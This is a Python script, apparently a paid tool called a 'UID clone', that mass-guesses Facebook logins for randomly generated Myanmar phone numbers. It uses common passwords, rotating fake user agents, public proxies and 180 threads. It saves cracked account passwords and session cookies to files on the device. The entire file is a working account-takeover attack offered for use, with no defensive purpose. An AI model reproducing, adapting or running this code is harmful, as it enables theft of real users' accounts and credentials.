import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (iPhone; CPU iPhone OS'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=' like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/FBIOS;FBAV/'
    h=random.randrange(109,379)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(20,100)
    l=' FBBV/101310068;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/Proximus;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
         
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def main():
    os.system('clear')
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print("\033[38;5;43m┃ \033[1;32m[\033[1;97m1\033[1;32m] \033[1;97mSTART UID CLONE                                  \033[38;5;43m┃")
    print("\033[38;5;43m┃ \033[1;32m[\033[1;97m0\033[1;32m] \033[1;91mEXIT TOOL                                        \033[38;5;43m┃ ")
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    ZWE = input(f'\033[1;32m  [\033[1;97m?\033[1;32m] \033[1;97mSELECT \033[38;5;41m━━\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(ycode)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print("\033[38;5;43m┃\033[1;32m [\033[1;97m✔\033[1;32m]\033[1;97m EXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m788\033[1;32m] / [\033[1;97m444\033[1;32m] / [\033[1;97m670\033[1;32m] / [\033[1;97m779\033[1;32m] / [\033[1;97metc.\033[1;32m]\033[38;5;43m┃")
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    code = input('\033[1;32m  [\033[1;97m?\033[1;32m]\033[1;97m INPUT YOUR CODE \033[38;5;41m━━\033[1;32m ')
    os.system('clear')
    print(ylimit)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print("\033[38;5;43m┃\033[1;32m [\033[1;97m✔\033[1;32m] \033[1;97mEXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m3000\033[1;32m] / [\033[1;97m5000\033[1;32m] / [\033[1;97m10000\033[1;32m] / [\033[1;97metc..\033[1;32m]   \033[38;5;43m┃")
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    limit=int(input("\033[1;32m  [\033[1;32m?\033[1;32m]\033[1;97m INPUT YOUR LIMIT \033[38;5;41m━━\033[1;32m "))    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=180) as LEE:
        os.system('clear')
        print(ysearch)
        tl = str(len(user))
        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f'\033[1;32m\033[38;5;43m┃ [\033[1;91m❃\033[1;32m]\033[1;97m TOTAL ID        \033[38;5;41m ━━━━━    \033[1;32m'+tl+'                    \033[38;5;43m┃')
        print(f'\033[1;32m\033[38;5;43m┃ [\033[1;91m❃\033[1;32m]\033[1;97m CHOICE CODE     \033[38;5;41m ━━━━━    \033[1;32m'+code+'                     \033[38;5;43m┃')
        print(f"\033[1;32m\033[38;5;43m┃ [\033[1;91m❃\033[1;32m] \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!            \033[38;5;43m┃")
        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        linex()
        for love in user:
            uid = '+959'+code+love
            pwx = [code+love,love,code+love[:3],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','aungaung','zawzaw','chitchit']
            LEE.submit(rcrack,uid,pwx,tl)

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            fb="m"
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mSEARCHING\033[1;91m]⏳[\033[1;92m%s\033[1;91m]⌛[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method':'POST',
            'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
            'scheme':'https',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-asbd-id': '198387',
            'x-fb-lsd': 'AVoPmsopEAk',
            'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32m  [✔] {uid} ━━ {ps}" '  \n\033[1;36m[COOKIE] ━━ \033[1;35m'+coki+  '')
                open('/sdcard/KO-ZWEL-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;90m  [✖] {uid} ━━ {ps}")
                open('/sdcard/KO-ZWE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

logo= ("""$$$$$$$$\ $$\   $$\       $$\   $$\  $$$$$$\  $$\   $$\
    $$  / $$ |$$  /       $$ |  $$ |$$$$\ $$ |$$ |  $$ |
   $$  /  $$$$$  /$$$$$$\ $$$$$$$$ |$$\$$\$$ |$$$$$$$$ |
  $$  /   $$  $$< \______|\_____$$ |$$ \$$$$ |\_____$$ |
 $$  /    $$ |\$$\              $$ |$$ |\$$$ |      $$ |                                                  $$$$$$$$\ $$ | \$$\             $$ |\$$$$$$  /      $$ |
\________|\__|  \__|            \__| \______/       \__|
----------------------------------------------------------
[~] Author   : ZIN KO KO
[~] Tool     : Paid
[~] Version  : 32.0
\033[1;37m----------------------------------------------""") 
def linex():
	print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
ycode= ("""
$$$$$$$$\ $$\   $$\       $$\   $$\  $$$$$$\  $$\   $$\
    $$  / $$ |$$  /       $$ |  $$ |$$$$\ $$ |$$ |  $$ |
   $$  /  $$$$$  /$$$$$$\ $$$$$$$$ |$$\$$\$$ |$$$$$$$$ |
  $$  /   $$  $$< \______|\_____$$ |$$ \$$$$ |\_____$$ |
 $$  /    $$ |\$$\              $$ |$$ |\$$$ |      $$ |                                                  $$$$$$$$\ $$ | \$$\             $$ |\$$$$$$  /      $$ |
\________|\__|  \__|            \__| \______/       \__|
----------------------------------------------------------
[~] Author   : ZIN KO KO
[~] Tool     : Paid
[~] Version  : 32.0
\033[1;37m----------------------------------------------""") 

ylimit= ("""
$$$$$$$$\ $$\   $$\       $$\   $$\  $$$$$$\  $$\   $$\
    $$  / $$ |$$  /       $$ |  $$ |$$$$\ $$ |$$ |  $$ |
   $$  /  $$$$$  /$$$$$$\ $$$$$$$$ |$$\$$\$$ |$$$$$$$$ |
  $$  /   $$  $$< \______|\_____$$ |$$ \$$$$ |\_____$$ |
 $$  /    $$ |\$$\              $$ |$$ |\$$$ |      $$ |                                                  $$$$$$$$\ $$ | \$$\             $$ |\$$$$$$  /      $$ |
\________|\__|  \__|            \__| \______/       \__|
----------------------------------------------------------
[~] Author   : ZIN KO KO
[~] Tool     : Paid
[~] Version  : 32.0
\033[1;37m----------------------------------------------""") 

ysearch= ("""
$$$$$$$$\ $$\   $$\       $$\   $$\  $$$$$$\  $$\   $$\
    $$  / $$ |$$  /       $$ |  $$ |$$$$\ $$ |$$ |  $$ |
   $$  /  $$$$$  /$$$$$$\ $$$$$$$$ |$$\$$\$$ |$$$$$$$$ |
  $$  /   $$  $$< \______|\_____$$ |$$ \$$$$ |\_____$$ |
 $$  /    $$ |\$$\              $$ |$$ |\$$$ |      $$ |                                                  $$$$$$$$\ $$ | \$$\             $$ |\$$$$$$  /      $$ |
\________|\__|  \__|            \__| \______/       \__|
----------------------------------------------------------
[~] Author   : ZIN KO KO
[~] Tool     : Paid
[~] Version  : 32.0
\033[1;37m----------------------------------------------""") 

main()
